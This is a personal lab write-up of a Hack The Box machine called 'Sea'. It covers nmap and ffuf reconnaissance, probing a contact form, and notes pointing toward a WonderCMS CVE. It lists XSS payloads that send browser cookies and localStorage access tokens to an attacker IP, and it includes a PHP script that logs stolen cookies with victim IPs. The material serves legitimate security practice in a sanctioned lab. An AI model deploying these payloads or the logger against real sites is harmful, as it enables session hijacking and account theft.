---
tags:
  - Linux
  - HTB
  - Season6
  - XSS
  - Hijacking
creation date: 2024-08-16T14:50:00
CVEs: 10.129.13.15
URL:
---
## Information Gathering
### Nmap
`sudo nmap -sT -sV -sC -O -p- -T5 $IP  `

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

### ffuf
```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt:FUZZ -u http://sea.htb/FUZZ 
```

There's a "contact" link on the "How to Participate" page
Click that and you'll find a form

```session
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u $URL -H "HOST: FUZZ.jab.htb"
```

nothing from ffuf...

#### Testing form contact.php
i tried a bunch of shit in burp- injecting crap into every parameter
i even tried fuzzing for parameters
i tried entering my IP as the website URL - got nothing...
finally decided to pop over to 0xBEN and see what his hint was... turns out i was on the right track with using my IP as the web URL........

![[Pasted image 20240816165316.png]]
now to figure out the expoit....
Finally... is a XSS session hijacking thing
time to review the HTB lesson https://enterprise.hackthebox.com/academy-lab/5343/5286/modules/103/1008

## Exploiting the XSS Vulnerability with Session Hijacking

JavaScript payloads to try:
```javascript
document.location='http://10.10.15.64:80/index.php?c='+document.cookie;
new Image().src='http://10.10.15.64:8000/index.php?c='+document.cookie;

<script>document.location='http://10.10.15.64:00/XSS/index.php?c='+document.cookie</script>

<script>document.location='http://10.10.15.64:00/XSS/index.php?c='+localStorage.getItem('access_token')</script>

<script>new Image().src="http://10.10.15.64:80/index.php?c="+document.cookie;</script>

<script>new Image().src="http://10.10.15.64:80/index.php?c="+localStorage.getItem('access_token');</script>
```

working payload script.js
```javascript

```

index.html code:
```html
<script src=http://10.10.15.64:80/script.js></script>
```

index.php script:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

host a php server and move all the files to it (index.php, index.html, script.js)
```session
mkdir /tmp/tmpserver 
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

![[Pasted image 20240816222201.png]]

**NOTHING IS WOKRING!!!!** 😢

## Time to look at Ben's Hints 😥
Basically he says keep looking at the website and it's code 😒
### Nikto

![[Pasted image 20240817083644.png]]

### Checking out the code

![[Pasted image 20240817083717.png]]

![[Pasted image 20240817083732.png]]

So its running WonderCMS.... which has a few CVEs 💰

https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413#file-cve-2023-41425-md